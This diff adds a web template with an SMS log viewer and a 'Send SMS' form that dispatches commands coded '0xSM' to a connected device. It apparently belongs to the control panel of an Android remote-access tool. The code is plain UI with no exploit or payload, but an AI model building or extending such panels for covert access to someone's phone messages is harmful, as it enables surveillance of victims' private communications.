@@ -1,0 +1,174 @@
+<div class="ui top attached orange inverted tabular menu">
+    <a class="item active" data-tab="first">
+        SMS Log
+    </a>
+    <a class="item " data-tab="second">
+        Send SMS
+    </a>
+</div>
+
+<div class="ui bottom attached tab segment active" data-tab="first">
+    <!-- SMS Log -->
+    <div class="ui secondary menu">
+        <div class="right menu">
+            <button onclick="updateButton(this, '0xSM', {'action': 'ls'})" class="ui blue button"> <i
+                    class="icon sync"></i>Update</button>
+        </div>
+    </div>
+    <div class="ui feed">
+
+        <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+        <div class="event">
+            <div class="label">
+                <i class="arrow <%= status.updown %> icon"></i>
+            </div>
+            <div class="content">
+                <div class="summary">
+                    <%= status.action %> <a href="?filter=<%= smsData.address %>"><%= smsData.address %></a>
+                    <div class="date"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></div>
+                </div>
+                <div class="extra text">
+                    <%= smsData.body %>
+                </div>
+            </div>
+            <div class="ui divider"></div>
+
+        </div>
+        <div class="ui divider"></div>
+
+        <% }) %>
+    </div>
+</div>
+
+<div class="ui bottom attached tab segment" data-tab="second">
+    <!-- Send SMS -->
+    <div class="ui form">
+        <div class="ui labeled input fluid">
+            <div class="ui label">
+                To
+            </div>
+            <input id="to" type="number">
+        </div>
+        <br>
+        <div class="field">
+            <label>Message</label>
+            <textarea id="sms"></textarea>
+        </div>
+        <button class="ui button fluid positive" type="submit" onclick="sendSMS(this)">
+            <i class="paper plane outline icon"></i>
+            Send
+        </button>
+    </div>
+</div>
+
+<style>
+    :root {
+        --orange-primary: #FF6B2B;
+        --orange-light: #FF8F5C;
+        --orange-dark: #CC4A15;
+        --cyber-black: #0A0A0A;
+        --cyber-dark: #151515;
+        --cyber-gray: #1E1E1E;
+        --neon-orange: #FF4D00;
+        --neon-blue: #00F0FF;
+        --text-primary: #FFFFFF;
+        --text-secondary: rgba(255, 255, 255, 0.7);
+        --orange-glow: 0 0 10px var(--orange-primary),
+                      0 0 20px rgba(255, 107, 43, 0.5),
+                      0 0 40px rgba(255, 107, 43, 0.3);
+        --font-mono: 'JetBrains Mono', monospace;
+    }
+
+    .ui.menu {
+        background: var(--cyber-dark);
+        border-color: var(--orange-primary);
+    }
+
+    .ui.menu .item {
+        color: var(--text-primary);
+        font-family: var(--font-mono);
+    }
+
+    .ui.menu .active.item {
+        background: var(--orange-primary);
+        color: var(--text-primary);
+    }
+
+    .ui.segment {
+        background: var(--cyber-dark);
+        border: 2px solid var(--orange-primary);
+        border-radius: 8px;
+        color: var(--text-secondary);
+    }
+
+    .ui.button {
+        background: var(--orange-primary) !important;
+        color: var(--text-primary) !important;
+        font-family: var(--font-mono) !important;
+        border: 2px solid var(--orange-primary) !important;
+        box-shadow: var(--orange-glow);
+        transition: all 0.3s ease;
+    }
+
+    .ui.feed > .event {
+        border-left: 2px solid var(--orange-primary);
+        margin: 1em;
+        padding: 0.5em;
+    }
+
+    .ui.feed > .event a {
+        color: var(--neon-blue);
+    }
+
+    .ui.form input, .ui.form textarea {
+        background: var(--cyber-gray);
+        border: 1px solid var(--orange-primary);
+        color: var(--text-primary);
+        font-family: var(--font-mono);
+    }
+
+    .ui.label {
+        background: var(--orange-primary);
+        color: var(--text-primary);
+        font-family: var(--font-mono);
+    }
+</style>
+
+<script>
+    $('.menu .item').tab();
+    function sendSMS(element) {
+        $(element).addClass('loading')
+        sendCommand('0xSM', {
+            'action': 'sendSMS',
+            'sms': $('#sms').val(),
+            'to': $('#to').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'SMS Sent');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
